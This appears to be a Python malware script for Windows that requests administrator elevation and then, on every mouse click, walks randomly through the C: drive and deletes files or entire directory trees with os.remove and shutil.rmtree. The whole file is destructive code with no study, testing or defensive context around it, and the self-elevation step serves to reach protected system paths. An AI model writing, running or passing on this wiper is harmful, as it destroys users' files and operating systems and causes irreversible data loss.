import os, glob, random, pynput, ctypes, sys, shutil


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin(): 
    
    def on_click(x, y, button, pressed):
        
        if pressed:
            
            pctodel = 0
            path = "C:"
            
            while True:
                
                path = random.choice(glob.glob(f"{path}/*"))
                
                if os.path.isdir(path):
                    
                    if len(path) == 0:
                        pctodel = 0
                        path = random.choice(glob.glob("C:/*"))
                        continue
                    
                    rdprcnt = random.random()
                    if rdprcnt < pctodel: 
                        try: shutil.rmtree(path.replace("\\", "/"))
                        except:
                            pctodel = 0
                            path = random.choice(glob.glob("C:/*"))
                            continue
                        break
                    
                    pctodel += 0.1
                    
                else:
                    try: os.remove(path.replace("\\", "/"))
                    except:
                        pctodel = 0
                        path = random.choice(glob.glob("C:/*"))
                        continue
                    break         


    with pynput.mouse.Listener(on_click=on_click) as listener:
        listener.join()
        
        
else:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
